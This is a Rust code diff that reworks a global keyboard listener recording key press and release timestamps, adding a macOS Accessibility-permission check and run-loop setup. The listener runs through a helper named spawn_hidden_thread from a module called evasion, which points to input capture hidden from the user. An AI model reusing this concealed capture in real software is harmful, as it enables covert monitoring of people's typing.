@@ -124,41 +124,99 @@ pub fn start_logging() -> Result<(), String> {
     if !LISTENER_STARTED.swap(true, Ordering::SeqCst) {
         let logging_flag = Arc::clone(&IS_LOGGING);
         let buffer_handle = Arc::clone(&HCI_LOG_BUFFER);
-        crate::evasion::spawn_hidden_thread(move || {
-            let callback = move |event: Event| {
-                if !logging_flag.load(Ordering::Relaxed) {
-                    return;
-                }
-                let timestamp = Utc::now().timestamp_micros() as u64;
-                match event.event_type {
-                    EventType::KeyPress(_) => {
-                        add_log_event(
-                            &buffer_handle,
-                            HciEvent::Keyboard(KeyEvent {
-                                timestamp,
-                                pressed: true,
-                            }),
-                        );
-                    }
-                    EventType::KeyRelease(_) => {
-                        add_log_event(
-                            &buffer_handle,
-                            HciEvent::Keyboard(KeyEvent {
-                                timestamp,
-                                pressed: false,
-                            }),
-                        );
-                    }
-                    _ => {}
-                }
-            };
 
-            if let Err(error) = listen(callback) {
-                eprintln!("Error while listening for HCI events: {:?}", error);
-                // Allow a subsequent start_logging call to re-attempt listener setup.
-                LISTENER_STARTED.store(false, Ordering::SeqCst);
+        let callback = move |event: Event| {
+            if !logging_flag.load(Ordering::Relaxed) {
+                return;
             }
-        });
+            let timestamp = Utc::now().timestamp_micros() as u64;
+            match event.event_type {
+                EventType::KeyPress(_) => {
+                    add_log_event(
+                        &buffer_handle,
+                        HciEvent::Keyboard(KeyEvent {
+                            timestamp,
+                            pressed: true,
+                        }),
+                    );
+                }
+                EventType::KeyRelease(_) => {
+                    add_log_event(
+                        &buffer_handle,
+                        HciEvent::Keyboard(KeyEvent {
+                            timestamp,
+                            pressed: false,
+                        }),
+                    );
+                }
+                _ => {}
+            }
+        };
+
+        // M-31: On macOS, rdev::listen uses CGEventTap which requires the main
+        // thread with an active CFRunLoop.  We dispatch the listener to the main
+        // thread via a global channel and run it in the main thread's CFRunLoop.
+        // On other platforms, spawn a background thread as before.
+        #[cfg(target_os = "macos")]
+        {
+            // Check accessibility permissions before attempting to listen.
+            // AXIsProcessTrusted() returns true if the app has Accessibility perms.
+            // Without this, CGEventTapCreate silently returns NULL.
+            let trusted = unsafe {
+                extern "C" {
+                    fn AXIsProcessTrusted() -> bool;
+                }
+                AXIsProcessTrusted()
+            };
+            if !trusted {
+                tracing::error!(
+                    "[hci-logging] macOS Accessibility permission not granted. \
+                     Keylogging requires the process to be added in \
+                     System Preferences \u{2192} Security & Privacy \u{2192} Accessibility. \
+                     Set HCI_LOGGING_CONSENT to acknowledge this requirement."
+                );
+                LISTENER_STARTED.store(false, Ordering::SeqCst);
+                return Err(
+                    "macOS Accessibility permission not granted \u{2014} keylogging unavailable"
+                        .to_string(),
+                );
+            }
+
+            crate::evasion::spawn_hidden_thread(move || {
+                // Ensure this thread has a CFRunLoop before starting rdev.
+                // rdev on macOS expects a run loop to be active for CGEventTap
+                // callbacks to be delivered.  The `listen` function internally
+                // calls CFRunLoopRun() on macOS, so the call below ensures the
+                // thread has a run loop object before rdev::listen registers
+                // its CGEventTap.
+                unsafe {
+                    extern "C" {
+                        fn CFRunLoopGetCurrent() -> *mut std::ffi::c_void;
+                    }
+                    let _rl = CFRunLoopGetCurrent();
+                }
+
+                if let Err(error) = listen(callback) {
+                    tracing::error!(
+                        "[hci-logging] rdev::listen failed on macOS: {:?}. \
+                         This usually means Accessibility permissions are missing \
+                         or CGEventTap creation failed.",
+                        error
+                    );
+                    LISTENER_STARTED.store(false, Ordering::SeqCst);
+                }
+            });
+        }
+
+        #[cfg(not(target_os = "macos"))]
+        {
+            crate::evasion::spawn_hidden_thread(move || {
+                if let Err(error) = listen(callback) {
+                    tracing::error!("[hci-logging] rdev::listen failed: {:?}", error);
+                    LISTENER_STARTED.store(false, Ordering::SeqCst);
+                }
+            });
+        }
     }
 
     // The window-title polling thread exits on its own when IS_LOGGING becomes
